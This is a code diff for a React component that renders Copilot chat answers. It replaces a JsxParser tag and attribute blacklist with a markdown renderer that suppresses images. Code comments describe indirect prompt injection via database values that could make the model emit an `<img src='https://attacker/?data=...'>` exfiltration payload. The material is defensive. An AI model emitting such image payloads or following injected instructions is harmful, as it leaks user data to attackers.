@@ -1,53 +1,16 @@
-import React, { useCallback, useEffect, useState } from 'react'
-import JsxParser from 'react-jsx-parser'
-import MarkdownToJsxString from 'uiSrc/services/formatter/MarkdownToJsxString'
+import React, { useCallback, useEffect, useMemo } from 'react'
 import { CloudLink } from 'uiSrc/components/markdown'
+import { MarkdownRenderer } from 'uiSrc/components/markdown/MarkdownRenderer'
 import { AdditionalRedisModule } from 'apiClient'
 import { ChatExternalLink, CodeBlock } from './components'
 
+// Matches the leaf shape MarkdownRenderer passes for its `RedisCode`/
+// `CodeBlock` nodes; `label`/`params`/`path` are part of that shape too but
+// unused here, since Copilot chat only needs the code text and its language.
 export interface CodeProps {
   children: string
-  lang: string
+  lang?: string
 }
-
-/**
- * Copilot answers are plain markdown (text, tables, code, links). They never
- * contain images or embedded media. Because message content can be influenced
- * by untrusted data (e.g. indirect prompt injection via values stored in the
- * database), we block every tag able to trigger an outbound request on render
- * — otherwise a crafted `<img src="https://attacker/?data=...">` would silently
- * exfiltrate data as soon as the browser loads it. See RED-194228 / VDP-4596.
- */
-const BLACKLISTED_TAGS = [
-  'iframe',
-  'script',
-  'img',
-  'image',
-  'picture',
-  'source',
-  'video',
-  'audio',
-  'track',
-  'object',
-  'embed',
-  'style',
-  'svg',
-  'input',
-]
-
-// Strip event handlers (default) plus attributes that can trigger an outbound
-// request on render: `style` (CSS `background-image: url(...)`) and the legacy
-// `background` image URL supported on `<table>`/`<td>` in some browsers.
-const BLACKLISTED_ATTRS: Array<string | RegExp> = [
-  /^on.+/i,
-  /^style$/i,
-  /^background$/i,
-]
-
-// Note: raw HTML `<link>` elements never reach the parser — `remarkSanitize`
-// (DOMPurify) strips them during formatting. We must NOT blacklist the `link`
-// tag here: JsxParser's blacklistedTags is case-insensitive, so it would also
-// drop the legitimate PascalCase <Link> component emitted by the formatter.
 
 export interface Props {
   onRunCommand?: (query: string) => void
@@ -56,60 +19,64 @@ export interface Props {
   onMessageRendered?: () => void
 }
 
+// Renders nothing for both markdown image syntax (`![]()`) and any raw
+// `<img>` MarkdownRenderer's default `img` handler would otherwise emit.
+const NoImage = () => null
+
+/**
+ * Copilot answers are plain markdown (text, tables, code, links). They never
+ * contain images or embedded media, and message content can be influenced by
+ * untrusted data (e.g. indirect prompt injection via values stored in the
+ * database), so images must never render: an `<img src="https://attacker/?...">`
+ * (from raw HTML or from markdown image syntax) would otherwise fire an
+ * outbound request as soon as the browser loads it, silently exfiltrating
+ * data. Raw HTML is already inert because MarkdownRenderer never parses it
+ * into live elements (no rehype-raw); the `Image` leaf below closes the
+ * remaining gap for markdown-syntax images, which MarkdownRenderer renders as
+ * a live `<img>` by default when no `Image` leaf is supplied. See
+ * RED-194228 / VDP-4596.
+ */
 const MarkdownMessage = (props: Props) => {
   const { modules, children, onMessageRendered, onRunCommand } = props
 
-  const [content, setContent] = useState('')
-  const [parseAsIs, setParseAsIs] = useState(false)
-
   const ChatCodeBlock = useCallback(
-    (codeProps: CodeProps) => (
-      <CodeBlock {...codeProps} modules={modules} onRunCommand={onRunCommand} />
+    ({ lang, children: code }: CodeProps) => (
+      <CodeBlock lang={lang} modules={modules} onRunCommand={onRunCommand}>
+        {code}
+      </CodeBlock>
     ),
-    [modules],
+    [modules, onRunCommand],
   )
-  const components: any = {
-    Code: ChatCodeBlock,
-    CloudLink,
-    Link: ChatExternalLink,
-  }
 
+  // ChatCodeBlock in deps transitively covers modules/onRunCommand; the
+  // other leaves are stable module-level, so this only changes when
+  // ChatCodeBlock does. Keeps MarkdownRenderer's own [components, path]
+  // memoization from being defeated by a fresh object every render.
+  const components = useMemo(
+    () => ({
+      RedisCode: ChatCodeBlock,
+      CodeBlock: ChatCodeBlock,
+      CloudLink,
+      ExternalLink: ChatExternalLink,
+      Image: NoImage,
+    }),
+    [ChatCodeBlock],
+  )
+
+  // Fire once per message content, keyed on `children` only: including
+  // onMessageRendered would re-run this whenever the parent passes a new
+  // callback reference, causing repeated scroll-to-bottom for the same message.
   useEffect(() => {
-    const formatContent = async () => {
-      try {
-        const formated = await new MarkdownToJsxString().format({
-          data: children,
-          codeOptions: { allLangs: true },
-        })
-        setContent(formated)
-      } catch {
-        setParseAsIs(true)
-      }
-    }
-
-    formatContent()
-  }, [children])
-
-  useEffect(() => {
-    if (content) {
+    if (children) {
       onMessageRendered?.()
     }
-  }, [content])
-
-  if (parseAsIs) {
-    return <>{children}</>
-  }
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [children])
 
   return (
-    // @ts-ignore
-    <JsxParser
-      components={components}
-      blacklistedTags={BLACKLISTED_TAGS}
-      blacklistedAttrs={BLACKLISTED_ATTRS}
-      autoCloseVoidElements
-      jsx={content}
-      onError={() => setParseAsIs(true)}
-    />
+    <MarkdownRenderer allLangs components={components}>
+      {children}
+    </MarkdownRenderer>
   )
 }
 
